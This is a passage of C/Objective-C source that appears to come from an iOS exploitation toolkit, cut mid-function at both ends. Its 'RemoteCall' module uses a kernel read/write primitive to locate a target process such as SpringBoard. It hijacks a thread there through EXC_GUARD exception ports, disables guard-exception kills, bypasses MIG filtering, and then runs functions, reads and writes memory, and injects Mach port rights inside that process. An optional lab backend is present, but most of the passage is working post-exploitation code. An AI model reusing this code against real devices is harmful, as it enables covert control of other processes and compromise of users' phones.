static void abandon_remote_call_internal(void) {
    if (cnd_lab_remotecall_has_state(&g_RC_labClient)) {
        cnd_lab_remotecall_abandon(&g_RC_labClient);
        g_RC_pid = 0;
        g_RC_trojanMem = 0;
        g_RC_success = false;
        g_RC_creatingExtraThread = false;
        g_RC_threadList = [NSMutableArray new];
        return;
    }

    // Skip every SB-side IPC. Caller has decided that the remote task is dead
    // (typically SpringBoard finished a respawn). Touching the dead trojan
    // would hang for the call timeout. Local resources still need releasing.
    destroy_exception_port(g_RC_firstExceptionPort);
    destroy_exception_port(g_RC_secondExceptionPort);
    if (g_RC_dummyThread) pthread_cancel(g_RC_dummyThread);
    if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
        mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
    }
    remote_call_release_identity_rights();
    clear_remote_shmem_cache();
    (void)reap_dead_port_names("abandon_remote_call");
    g_RC_taskAddr = 0;
    g_RC_procAddr = 0;
    g_RC_firstExceptionPort = MACH_PORT_NULL;
    g_RC_secondExceptionPort = MACH_PORT_NULL;
    g_RC_firstExceptionPortAddr = 0;
    g_RC_secondExceptionPortAddr = 0;
    g_RC_dummyThread = NULL;
    g_RC_dummyThreadMach = MACH_PORT_NULL;
    g_RC_dummyThreadAddr = 0;
    g_RC_dummyThreadTro = 0;
    g_RC_selfThreadAddr = 0;
    g_RC_selfThreadCtid = 0;
    memset(&g_RC_callThreadResumeState, 0, sizeof(g_RC_callThreadResumeState));
    g_RC_callThreadResumeStateValid = false;
    g_RC_callThreadNaturalReturn = false;
    g_RC_syntheticCallInFlight = false;
    g_RC_deferredTeardownScheduled = false;
    g_RC_vmMap = 0;
    g_RC_callThreadAddr = 0;
    g_RC_trojanThreadAddr = 0;
    g_RC_pid = 0;
    g_RC_success = false;
    g_RC_creatingExtraThread = false;
    g_RC_trojanMem = 0;
    g_RC_threadList = [NSMutableArray new];
}

int destroy_remote_call(void) {
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    int res = destroy_remote_call_internal();
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return res;
}

static int destroy_remote_call_internal(void) {
    if (cnd_lab_remotecall_has_state(&g_RC_labClient)) {
        int closeResult = cnd_lab_remotecall_close(&g_RC_labClient);
        g_RC_pid = 0;
        g_RC_trojanMem = 0;
        g_RC_success = false;
        g_RC_creatingExtraThread = false;
        g_RC_threadList = [NSMutableArray new];
        if (closeResult != 0) {
            printf("[RemoteCall] lab session close failed error=%d (%s)\n",
                   closeResult, strerror(closeResult));
            return -1;
        }
        return 0;
    }

    if (!remote_call_has_local_state()) {
        clear_remote_shmem_cache();
        (void)reap_dead_port_names("destroy_remote_call");
        g_RC_success = false;
        g_RC_threadList = [NSMutableArray new];
        return 0;
    }

    // A return-to-sentinel call is still executing. Starting another stable
    // call here would consume its eventual completion as the *next* dispatch
    // trap, corrupt the protocol, and can crash the live target. Ownership
    // must be handed to the deferred drainer instead.
    if (g_RC_syntheticCallInFlight) {
        printf("[RemoteCall] Refusing synchronous teardown while a synthetic call is still in flight.\n");
        return -2;
    }

    int teardownResult = 0;
    if (g_RC_trojanMem) {
        do_remote_call_stable_internal(100, "munmap", g_RC_trojanMem, PAGE_SIZE, 0, 0, 0, 0, 0, 0);
        if (g_RC_syntheticCallInFlight) {
            printf("[RemoteCall] Teardown munmap is still in flight; deferring the remaining teardown.\n");
            return -2;
        }
        if (!g_RC_success) teardownResult = -1;
        g_RC_trojanMem = 0;
    }
    if (g_RC_creatingExtraThread) {
        if (!restore_call_thread_natural_state()) teardownResult = -1;
    }
    else {
        if (!restore_trojan_thread(&g_RC_originalState)) teardownResult = -1;
    }

    destroy_exception_port(g_RC_firstExceptionPort);
    if (teardownResult == 0 || !g_RC_creatingExtraThread) {
        destroy_exception_port(g_RC_secondExceptionPort);
    } else {
        printf("[RemoteCall] Leaving synthetic exception port 0x%x alive after incomplete teardown.\n",
               g_RC_secondExceptionPort);
    }
    if (g_RC_dummyThread) pthread_cancel(g_RC_dummyThread);
    if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
        mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
    }
    remote_call_release_identity_rights();
    clear_remote_shmem_cache();
    (void)reap_dead_port_names("destroy_remote_call");
    g_RC_taskAddr = 0;
    g_RC_procAddr = 0;
    g_RC_firstExceptionPort = MACH_PORT_NULL;
    g_RC_secondExceptionPort = MACH_PORT_NULL;
    g_RC_firstExceptionPortAddr = 0;
    g_RC_secondExceptionPortAddr = 0;
    g_RC_dummyThread = NULL;
    g_RC_dummyThreadMach = MACH_PORT_NULL;
    g_RC_dummyThreadAddr = 0;
    g_RC_dummyThreadTro = 0;
    g_RC_selfThreadAddr = 0;
    g_RC_selfThreadCtid = 0;
    memset(&g_RC_callThreadResumeState, 0, sizeof(g_RC_callThreadResumeState));
    g_RC_callThreadResumeStateValid = false;
    g_RC_callThreadNaturalReturn = false;
    g_RC_syntheticCallInFlight = false;
    g_RC_deferredTeardownScheduled = false;
    g_RC_vmMap = 0;
    g_RC_callThreadAddr = 0;
    g_RC_trojanThreadAddr = 0;
    g_RC_pid = 0;
    g_RC_success = false;
    g_RC_creatingExtraThread = false;
    g_RC_trojanMem = 0;
    
    g_RC_threadList = [NSMutableArray new];
    
    return teardownResult;
}

bool remote_call_has_local_state(void) {
    return cnd_lab_remotecall_has_state(&g_RC_labClient) ||
           g_RC_taskAddr ||
           g_RC_procAddr ||
           MACH_PORT_VALID(g_RC_firstExceptionPort) ||
           MACH_PORT_VALID(g_RC_secondExceptionPort) ||
           g_RC_firstExceptionPortAddr ||
           g_RC_secondExceptionPortAddr ||
           g_RC_dummyThread ||
           MACH_PORT_VALID(g_RC_dummyThreadMach) ||
           g_RC_dummyThreadAddr ||
           g_RC_dummyThreadTro ||
           MACH_PORT_VALID(g_RC_identityThreadPort) ||
           MACH_PORT_VALID(g_RC_identityTaskPort) ||
           g_RC_vmMap ||
           g_RC_callThreadAddr ||
           g_RC_trojanThreadAddr ||
           g_RC_pid ||
           g_RC_trojanMem;
}

bool remote_call_copy_debug_snapshot(RemoteCallDebugSnapshot *outSnapshot)
{
    if (!outSnapshot) return false;

    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);

    memset(outSnapshot, 0, sizeof(*outSnapshot));
    outSnapshot->hasLocalState = remote_call_has_local_state();
    outSnapshot->success = g_RC_success;
    outSnapshot->labBackend = remote_call_uses_lab_backend();
    outSnapshot->pid = g_RC_pid;
    outSnapshot->procAddr = g_RC_procAddr;
    outSnapshot->taskAddr = g_RC_taskAddr;
    outSnapshot->vmMap = g_RC_vmMap;
    outSnapshot->trojanThreadAddr = g_RC_trojanThreadAddr;
    outSnapshot->trojanMem = g_RC_trojanMem;
    outSnapshot->stableCalls = g_RC_stableCalls;
    outSnapshot->stableFailures = g_RC_stableFailures;
    outSnapshot->ioFailures = g_RC_ioFailures;
    outSnapshot->shmemEvictions = g_RC_shmemEvictions;
    outSnapshot->shmemClock = g_RC_shmemClock;
    outSnapshot->identityBootstrapRequested =
        g_RC_identityBootstrapRequested;
    outSnapshot->identityMessageValid = g_RC_identityMessageValid;
    outSnapshot->identityThreadRightExact =
        g_RC_identityThreadRightExact;
    outSnapshot->identityTaskRightExact = g_RC_identityTaskRightExact;
    outSnapshot->identityHandlerDowngraded =
        g_RC_identityHandlerDowngraded;
    outSnapshot->identityHandlerRetained =
        g_RC_identityHandlerRetained;
    outSnapshot->identityInitialConversionSucceeded =
        g_RC_identityInitialConversionSucceeded;
    outSnapshot->identityInitialReplySucceeded =
        g_RC_identityInitialReplySucceeded;
    outSnapshot->identityThreadAddr = g_RC_identityThreadAddr;
    outSnapshot->identityTrapAddress = g_RC_identityTrapAddress;
    outSnapshot->identityConversionCount = g_RC_identityConversionCount;
    outSnapshot->identityConversionFailures =
        g_RC_identityConversionFailures;
    outSnapshot->identityConverterUnavailable =
        g_RC_identityConverterUnavailable;
    outSnapshot->identityPACFallbackCount =
        g_RC_identityPACFallbackCount;
    outSnapshot->identityPACFallbackFailures =
        g_RC_identityPACFallbackFailures;
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (g_RC_shmemCache[i].used) outSnapshot->shmemUsed++;
    }
    remote_call_copy_cstring(outSnapshot->lastStableCall,
                             sizeof(outSnapshot->lastStableCall),
                             g_RC_lastStableCall);
    remote_call_copy_cstring(outSnapshot->lastStableFailure,
                             sizeof(outSnapshot->lastStableFailure),
                             g_RC_lastStableFailure);
    remote_call_copy_cstring(outSnapshot->lastStableFailureReason,
                             sizeof(outSnapshot->lastStableFailureReason),
                             g_RC_lastStableFailureReason);

    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return true;
}

bool remote_call_copy_original_thread_state(
    arm_thread_state64_internal *outState)
{
    if (!outState) return false;

    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    bool available = g_RC_pid > 0 && g_RC_trojanThreadAddr != 0;
    if (available) {
        memcpy(outState, &g_RC_originalState, sizeof(*outState));
    } else {
        memset(outState, 0, sizeof(*outState));
    }
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return available;
}

size_t remote_call_copy_original_thread_states(
    arm_thread_state64_internal *outStates, size_t capacity)
{
    if (!outStates || capacity == 0) return 0;

    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    size_t available = g_RC_pid > 0 && g_RC_trojanThreadAddr != 0
        ? g_RC_capturedOriginalStateCount : 0;
    size_t count = available < capacity ? available : capacity;
    if (count) {
        memcpy(outStates, g_RC_capturedOriginalStates,
               count * sizeof(*outStates));
    }
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return count;
}

bool remote_call_transfer_send_right_to_target(
    mach_port_t localRight,
    mach_port_name_t *targetNameOut,
    RemoteCallSendRightTransferReport *reportOut)
{
    RemoteCallSendRightTransferReport report = {0};
    report.mailboxAllocateResult = KERN_FAILURE;
    report.mailboxExtractResult = KERN_FAILURE;
    report.messageSendResult = (mach_msg_return_t)KERN_FAILURE;
    report.messageReceiveResult = (mach_msg_return_t)KERN_FAILURE;
    report.mailboxCleanupResult = KERN_FAILURE;
    snprintf(report.failureStage, sizeof(report.failureStage), "%s",
             "preflight");
    if (targetNameOut) *targetNameOut = MACH_PORT_NULL;

    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);

    report.taskRightAvailable = !remote_call_uses_lab_backend() &&
        g_RC_identityTaskRightExact &&
        MACH_PORT_VALID(g_RC_identityTaskPort) &&
        g_RC_pid > 0 && g_RC_taskAddr != 0;
    if (!targetNameOut || !MACH_PORT_VALID(localRight) ||
        !report.taskRightAvailable || !g_RC_success) {
        goto out;
    }

    mach_port_name_t targetMailbox = MACH_PORT_NULL;
    mach_port_t localMailboxSend = MACH_PORT_NULL;
    mach_msg_type_name_t extractedType = 0;
    uint64_t remoteMessage = 0;
    bool messageReceived = false;

    report.mailboxAllocateResult = mach_port_allocate(
        g_RC_identityTaskPort, MACH_PORT_RIGHT_RECEIVE, &targetMailbox);
    if (report.mailboxAllocateResult != KERN_SUCCESS ||
        !MACH_PORT_VALID(targetMailbox)) {
        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
                 "mailbox-allocate");
        goto cleanup;
    }

    report.mailboxExtractResult = mach_port_extract_right(
        g_RC_identityTaskPort, targetMailbox, MACH_MSG_TYPE_MAKE_SEND,
        &localMailboxSend, &extractedType);
    if (report.mailboxExtractResult != KERN_SUCCESS ||
        !MACH_PORT_VALID(localMailboxSend) ||
        extractedType != MACH_MSG_TYPE_PORT_SEND) {
        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
                 "mailbox-extract");
        goto cleanup;
    }

    remoteMessage = do_remote_call_stable_internal(
        1000, "mmap", 0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE,
        MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0, 0, 0);
    if (!remoteMessage || remoteMessage == UINT64_MAX || !g_RC_success) {
        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
                 "message-buffer");
        goto cleanup;
    }

    CNDRemoteCallSendRightMessage message = {0};
    message.head.msgh_bits = MACH_MSGH_BITS_COMPLEX |
        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    message.head.msgh_size = (mach_msg_size_t)sizeof(message);
    message.head.msgh_remote_port = localMailboxSend;
    message.head.msgh_id = CND_RC_SEND_RIGHT_MESSAGE_ID;
    message.body.msgh_descriptor_count = 1;
    message.right.name = localRight;
    message.right.disposition = MACH_MSG_TYPE_COPY_SEND;
    message.right.type = MACH_MSG_PORT_DESCRIPTOR;
    report.messageSendResult = mach_msg(
        &message.head, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
        message.head.msgh_size, 0, MACH_PORT_NULL, 1000,
        MACH_PORT_NULL);
    if (report.messageSendResult != MACH_MSG_SUCCESS) {
        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
                 "message-send");
        goto cleanup;
    }

    report.messageReceiveResult = (mach_msg_return_t)
        do_remote_call_stable_internal(
            1000, "mach_msg", remoteMessage,
            MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, PAGE_SIZE,
            targetMailbox, 1000, MACH_PORT_NULL, 0);
    messageReceived = report.messageReceiveResult == MACH_MSG_SUCCESS &&
        g_RC_success;
    if (!messageReceived) {
        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
                 "message-receive");
        goto cleanup;
    }

    CNDRemoteCallSendRightMessage received = {0};
    if (!remote_read_internal(remoteMessage, &received, sizeof(received))) {
        g_RC_ioFailures++;
        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
                 "message-readback");
        goto cleanup;
    }
    report.descriptorValidated =
        received.head.msgh_id == CND_RC_SEND_RIGHT_MESSAGE_ID &&
        received.head.msgh_size >= sizeof(received) &&
        (received.head.msgh_bits & MACH_MSGH_BITS_COMPLEX) != 0 &&
        received.body.msgh_descriptor_count == 1 &&
        received.right.type == MACH_MSG_PORT_DESCRIPTOR &&
        (received.right.disposition == MACH_MSG_TYPE_PORT_SEND ||
         received.right.disposition == MACH_MSG_TYPE_COPY_SEND) &&
        MACH_PORT_VALID(received.right.name);
    if (!report.descriptorValidated) {
        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
                 "descriptor-validation");
        goto cleanup;
    }

    report.targetName = received.right.name;
    *targetNameOut = report.targetName;
    report.failureStage[0] = '\0';

cleanup:
    if (messageReceived && !report.descriptorValidated && remoteMessage &&
        g_RC_success) {
        /* A received descriptor already owns a target-space send right.
         * Destroy malformed/unreadable messages before releasing storage so
         * a failed handoff cannot leak that right into the service. */
        (void)do_remote_call_stable_internal(
            1000, "mach_msg_destroy", remoteMessage,
            0, 0, 0, 0, 0, 0, 0);
    }
    if (remoteMessage && remoteMessage != UINT64_MAX && g_RC_success) {
        (void)do_remote_call_stable_internal(
            1000, "munmap", remoteMessage, PAGE_SIZE,
            0, 0, 0, 0, 0, 0);
    }
    if (MACH_PORT_VALID(localMailboxSend)) {
        mach_port_deallocate(mach_task_self_, localMailboxSend);
    }
    if (MACH_PORT_VALID(targetMailbox)) {
        report.mailboxCleanupResult = mach_port_mod_refs(
            g_RC_identityTaskPort, targetMailbox,
            MACH_PORT_RIGHT_RECEIVE, -1);
    }
    if (report.descriptorValidated &&
        report.mailboxCleanupResult != KERN_SUCCESS) {
        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
                 "mailbox-cleanup");
    }

out:
    if (reportOut) *reportOut = report;
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return report.descriptorValidated &&
        MACH_PORT_VALID(report.targetName) &&
        report.mailboxCleanupResult == KERN_SUCCESS;
}

kern_return_t remote_call_deallocate_target_send_right(
    mach_port_name_t targetName)
{
    if (!MACH_PORT_VALID(targetName)) return KERN_INVALID_NAME;
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    kern_return_t result = g_RC_identityTaskRightExact &&
        MACH_PORT_VALID(g_RC_identityTaskPort)
        ? mach_port_deallocate(g_RC_identityTaskPort, targetName)
        : KERN_INVALID_TASK;
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return result;
}

void remote_call_clear_shmem_cache_public(const char *reason)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);

    uint64_t used = 0;
    uint64_t evictions = g_RC_shmemEvictions;
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (g_RC_shmemCache[i].used) used++;
    }
    clear_remote_shmem_cache();
    uint32_t reaped = reap_dead_port_names(reason ?: "remote_call_clear_shmem_cache");
    printf("[RemoteCall] local shmem cache cleared%s%s used=%llu evictions=%llu reapedPorts=%u\n",
           reason ? ": " : "", reason ?: "",
           (unsigned long long)used,
           (unsigned long long)evictions,
           reaped);

    pthread_mutex_unlock(&g_universal_ipc_mutex);
}

struct VMShmem *get_shmem_from_cache(uint64_t pageAddr)
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (g_RC_shmemCache[i].used && g_RC_shmemCache[i].remoteAddress == pageAddr) {
            g_RC_shmemUseCounter[i] = ++g_RC_shmemClock;
            return &g_RC_shmemCache[i];
        }
    }
    return NULL;
}

struct VMShmem *put_shmem_in_cache(struct VMShmem *shmem)
{
    int slot = -1;
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (!g_RC_shmemCache[i].used) { slot = i; break; }
    }
    if (slot < 0) {
        uint64_t oldest = UINT64_MAX;
        for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
            if (g_RC_shmemUseCounter[i] < oldest) {
                oldest = g_RC_shmemUseCounter[i];
                slot = i;
            }
        }
        if (slot < 0) {
            printf("[%s:%d] g_RC_shmemCache eviction failed\n", __FUNCTION__, __LINE__);
            return NULL;
        }
        release_shmem_slot(slot);
        uint64_t events = ++g_RC_shmemEvictions;
        if (events == 1 || (events % 256) == 0) {
            printf("[RemoteCall] shmem cache LRU evicted slot=%d events=%llu\n",
                   slot, (unsigned long long)events);
        }
    }
    g_RC_shmemCache[slot] = *shmem;
    g_RC_shmemCache[slot].used = true;
    g_RC_shmemUseCounter[slot] = ++g_RC_shmemClock;
    return &g_RC_shmemCache[slot];
}

struct VMShmem *get_shmem_for_page(uint64_t pageAddr)
{
    struct VMShmem *cached = get_shmem_from_cache(pageAddr);
    if (cached) return cached;

    struct VMShmem newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
    if (!newShmem.localAddress) {
        static volatile uint64_t shmemRetryEvents = 0;
        uint64_t events = __sync_add_and_fetch(&shmemRetryEvents, 1);
        if (events == 1 || (events % 64) == 0) {
            printf("[RemoteCall] shmem map failed page=0x%llx; clearing cache and retrying event=%llu\n",
                   pageAddr, (unsigned long long)events);
        }
        clear_remote_shmem_cache();
        (void)reap_dead_port_names("shmem_retry");
        newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
    }
    if (!newShmem.localAddress)
            return NULL;
    return put_shmem_in_cache(&newShmem);
}

bool remote_read(uint64_t src, void *dst, uint64_t size)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    bool res = remote_read_internal(src, dst, size);
    if (!res && src && dst && size) g_RC_ioFailures++;
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return res;
}

static bool remote_read_internal(uint64_t src, void *dst, uint64_t size)
{
    if (!src || !dst || !size) return false;
    if (remote_call_uses_lab_backend()) {
        int result = cnd_lab_remotecall_read(
            &g_RC_labClient, src, dst, (size_t)size);
        if (result != 0) {
            printf("[RemoteCall] lab read failed target=%s address=%#llx "
                   "size=%llu error=%d (%s)\n",
                   g_RC_labClient.process, src, size, result,
                   strerror(result));
        }
        return result == 0;
    }
    uint64_t dstAddr = (uint64_t)(uintptr_t)dst;
    uint64_t until = src + size;

    while (src < until) {
        uint64_t remaining = until - src;
        uint64_t offs      = src & PAGE_MASK;
        uint64_t roundUp   = (src + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - src < remaining) ? (roundUp - src) : remaining;
        uint64_t pageAddr  = src & ~PAGE_MASK;

        struct VMShmem *page = get_shmem_for_page(pageAddr);
        if (!page) {
            printf("[%s:%d] remote_read failed: unable to find remote page\n", __FUNCTION__, __LINE__);
            return false;
        }
        memcpy((void *)(uintptr_t)dstAddr, (void *)(uintptr_t)(page->localAddress + offs), (size_t)copyCount);
        src     += copyCount;
        dstAddr += copyCount;
    }
    return true;
}

uint64_t remote_read64(uint64_t src)
{
    uint64_t val = 0;
    if (!remote_read(src, &val, sizeof(val))) return 0;
    return val;
}

void remote_hexdump(uint64_t remoteAddr, size_t size)
{
    uint8_t *buf = (uint8_t *)malloc(size);
    if (!buf) {
        return;
    }

    if (!remote_read(remoteAddr, buf, size)) {
        printf("[%s:%d] remote_read failed at 0x%llx\n", __FUNCTION__, __LINE__, (unsigned long long)remoteAddr);
        free(buf);
        return;
    }

    char ascii[17];
    ascii[16] = '\0';
    for (size_t i = 0; i < size; ++i) {
        if ((i % 16) == 0)
            printf("[0x%016llx+0x%03zx] ", (unsigned long long)remoteAddr, i);

        printf("%02X ", buf[i]);
        ascii[i % 16] = (buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) printf(" ");
                for (size_t j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");
                printf("|  %s \n", ascii);
            }
        }
    }

    free(buf);
}

bool remote_write(uint64_t dst, const void *src, uint64_t size)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    bool res = remote_write_internal(dst, src, size);
    if (!res && dst && src && size) g_RC_ioFailures++;
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return res;
}

static bool remote_write_internal(uint64_t dst, const void *src, uint64_t size)
{
    if (!src || !dst || !size) return false;
    if (remote_call_uses_lab_backend()) {
        int result = cnd_lab_remotecall_write(
            &g_RC_labClient, dst, src, (size_t)size);
        if (result != 0) {
            printf("[RemoteCall] lab write failed target=%s address=%#llx "
                   "size=%llu error=%d (%s)\n",
                   g_RC_labClient.process, dst, size, result,
                   strerror(result));
        }
        return result == 0;
    }
    
    uint64_t srcAddr = (uint64_t)(uintptr_t)src;
    uint64_t until   = dst + size;

    while (dst < until) {
        uint64_t remaining = until - dst;
        uint64_t offs      = dst & PAGE_MASK;
        uint64_t roundUp   = (dst + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - dst < remaining) ? (roundUp - dst) : remaining;
        uint64_t pageAddr  = dst & ~PAGE_MASK;

        struct VMShmem *page = get_shmem_for_page(pageAddr);
        if (!page) {
            printf("[%s:%d] remote_write failed: unable to find remote page\n", __FUNCTION__, __LINE__);
            return false;
        }

        memcpy((void *)(uintptr_t)(page->localAddress + offs), (const void *)(uintptr_t)srcAddr, (size_t)copyCount);
        dst     += copyCount;
        srcAddr += copyCount;
    }
    return true;
}

bool remote_write64(uint64_t dst, uint64_t val)
{
    return remote_write(dst, &val, sizeof(val));
}

bool remote_writeStr(uint64_t dst, const char *str)
{
    if (!str) return false;

    size_t len = strlen(str) + 1;
    return remote_write(dst, str, len);
}

uint64_t remote_call_trojan_mem(void)
{
    return g_RC_trojanMem;
}

uint64_t retry_first_thread(bool useMigFilterBypass) {
    if (useMigFilterBypass)
        mig_bypass_pause();
    
    sleep(1);
    
    if (useMigFilterBypass)
        mig_bypass_resume();
    
    return kread64(g_RC_taskAddr + off_task_threads_next);
}

// NOTE: Do not run this function while "attaching xcode" on iOS 18+, it will make device unstable.
static int init_remote_call_configured(const char* process,
                                       bool useMigFilterBypass,
                                       int requestedBootstrapThreadCount,
                                       void (^bootstrapProvoker)(void)) {
    clear_remote_shmem_cache();
    remote_call_note_init_failure(RemoteCallInitFailureNone, 0);
    g_RC_stableCalls = 0;
    g_RC_stableFailures = 0;
    g_RC_ioFailures = 0;
    g_RC_identityMessageValid = false;
    g_RC_identityThreadRightExact = false;
    g_RC_identityTaskRightExact = false;
    g_RC_identityHandlerDowngraded = false;
    g_RC_identityHandlerRetained = false;
    g_RC_identityInitialConversionSucceeded = false;
    g_RC_identityInitialReplySucceeded = false;
    g_RC_identityThreadAddr = 0;
    g_RC_identityTrapAddress = 0;
    g_RC_identityConversionCount = 0;
    g_RC_identityConversionFailures = 0;
    g_RC_identityConverterUnavailable = false;
    g_RC_identityPACFallbackCount = 0;
    g_RC_identityPACFallbackFailures = 0;
    memset(g_RC_lastStableCall, 0, sizeof(remote_call_current_state()->lastStableCall));
    memset(g_RC_lastStableFailure, 0, sizeof(remote_call_current_state()->lastStableFailure));
    memset(g_RC_lastStableFailureReason, 0, sizeof(remote_call_current_state()->lastStableFailureReason));
    memset(g_RC_capturedOriginalStates, 0,
           sizeof(remote_call_current_state()->capturedOriginalStates));
    g_RC_capturedOriginalStateCount = 0;

    if (cnd_lab_remotecall_opted_in()) {
        if (g_RC_targetProcOverride != 0) {
            printf("[RemoteCall] lab backend refuses kernel proc override for %s\n",
                   process ?: "(null)");
            g_RC_targetProcOverride = 0;
            remote_call_note_init_failure(RemoteCallInitFailureOther, 0);
            return -1;
        }
        char labError[128] = {0};
        int labResult = cnd_lab_remotecall_connect(
            process, &g_RC_labClient, labError, sizeof(labError));
        if (labResult != 0) {
            printf("[RemoteCall] explicit vPhone lab backend failed closed "
                   "target=%s error=%d (%s)\n",
                   process ?: "(null)", labResult,
                   labError[0] ? labError : strerror(labResult));
            remote_call_note_init_failure(RemoteCallInitFailureOther, 0);
            return -1;
        }
        g_RC_pid = g_RC_labClient.pid;
        g_RC_trojanMem = g_RC_labClient.scratchAddress;
        g_RC_success = true;
        printf("[RemoteCall] vPhone root-harness backend active target=%s "
               "pid=%d scratch=%#llx; kernel proc/task identity is intentionally not used.\n",
               process, g_RC_pid, g_RC_trojanMem);
        return 0;
    }

    if (!kexploit_krw_ready()) {
        printf("[%s:%d] KRW unavailable; refusing RemoteCall init for %s\n",
               __FUNCTION__, __LINE__, process);
        remote_call_note_init_failure(RemoteCallInitFailureKRWUnavailable, 0);
        return -1;
    }
    
    uint64_t procAddr;
    if (g_RC_targetProcOverride) {
        procAddr = g_RC_targetProcOverride;
        g_RC_targetProcOverride = 0;
        printf("[%s:%d] using caller-supplied proc override for %s proc=%#llx\n",
               __FUNCTION__, __LINE__, process, procAddr);
    } else {
        procAddr = proc_find_by_name(process);
    }
    if (!procAddr || procAddr == (uint64_t)-1 || !is_kaddr_valid(procAddr + off_proc_p_pid)) {
        printf("[%s:%d] process not found or invalid: %s proc=%#llx\n",
               __FUNCTION__, __LINE__, process, procAddr);
        remote_call_note_init_failure(RemoteCallInitFailureProcessMissing, 0);
        return -1;
    }
    uint32_t targetPid = kread32(procAddr + off_proc_p_pid);
    printf("[RemoteCall] Found %s in kernel (pid=%u) — preparing EXC_GUARD thread hijack.\n", process, targetPid);
    RC_DEBUG("[%s:%d] process: %s, pid: %u\n", __FUNCTION__, __LINE__, process, targetPid);
    g_RC_taskAddr = proc_task(procAddr);
    if (!g_RC_taskAddr || !is_kaddr_valid(g_RC_taskAddr)) {
        printf("[%s:%d] invalid task for process %s proc=%#llx task=%#llx\n",
               __FUNCTION__, __LINE__, process, procAddr, g_RC_taskAddr);
        remote_call_note_init_failure(RemoteCallInitFailureInvalidTask, targetPid);
        return -1;
    }
    g_RC_procAddr = procAddr;

    uint64_t selfTask = task_self();
    if (!selfTask || !is_kaddr_valid(selfTask)) {
        printf("[%s:%d] invalid self task while preparing %s RemoteCall task=%#llx\n",
               __FUNCTION__, __LINE__, process, selfTask);
        remote_call_note_init_failure(RemoteCallInitFailureInvalidTask, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] targetTask=%#llx selfTask=%#llx\n",
             __FUNCTION__, __LINE__, g_RC_taskAddr, selfTask);

    mach_port_t firstExceptionPort = create_exception_port();
    mach_port_t secondExceptionPort = create_exception_port();

    RC_DEBUG("[%s:%d] firstExceptionPort: 0x%x, secondExceptionPort: 0x%x\n", __FUNCTION__, __LINE__, firstExceptionPort, secondExceptionPort);
    
    if (!firstExceptionPort || !secondExceptionPort)
    {
        printf("[%s:%d] Couldn't create exception ports\n", __FUNCTION__, __LINE__);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureExceptionPort, targetPid);
        return -1;
    }
    
    // Make sure the task won't crash after we handle an exception.
    if (disable_excguard_kill(g_RC_taskAddr) != 0) {
        printf("[%s:%d] failed to prepare task_exc_guard for %s task=%#llx\n",
               __FUNCTION__, __LINE__, process, g_RC_taskAddr);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureTaskGuard, targetPid);
        return -1;
    }
    
    mach_exception_code_t guardCode = 0;
    EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
    EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
